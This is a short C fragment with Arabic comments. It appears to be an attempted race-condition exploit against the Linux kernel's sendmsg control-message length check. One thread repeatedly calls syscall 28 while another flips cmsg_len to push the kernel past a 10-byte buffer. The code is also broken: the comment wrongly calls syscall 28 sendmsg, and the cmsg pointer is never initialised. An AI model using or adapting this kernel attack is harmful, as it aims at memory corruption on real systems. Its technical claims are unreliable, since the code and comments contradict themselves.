// ... نفس التعريفات السابقة للهياكل ...

#define CONTROL_LEN 16 // سنصغر الحجم لنجعل تجاوز الحدود أسهل في الرصد
uint8_t control_buf[CONTROL_LEN];
struct cmsghdr *cmsg;

void *sendmsg_thread(void *arg) {
    struct msghdr msg = {0};
    msg.msg_control = control_buf;
    // نحدد الطول الكلي بـ 10 بايت فقط
    msg.msg_controllen = 10; 

    while(1) { 
        // syscall(28) هو sendmsg
        syscall(28, global_sock, &msg, 0); 
    }
    return NULL;
}

void *race_thread(void *arg) {
    while(1) {
        /* القيمة 9 بايت:
           - النواة ترى أن 9 <= 10 (صحيح) فتستمر.
           - النواة تنفذ ALIGN(9) فتصبح القيمة 12 (في أنظمة 32-بت أو حسب التراصف).
           - المؤشر يقفز إلى (بداية + 12) بينما المساحة الكلية 10 بايت فقط!
        */
        cmsg->cmsg_len = 9;   
        
        /* تبديل سريع لقيمة أصغر لتعطيل أي تدقيق منطقي بسيط 
           ولمحاولة جعل النواة تقرأ القيمة 9 بعد فحص الأمان الأول
        */
        cmsg->cmsg_len = 4; 
    }
    return NULL;
}
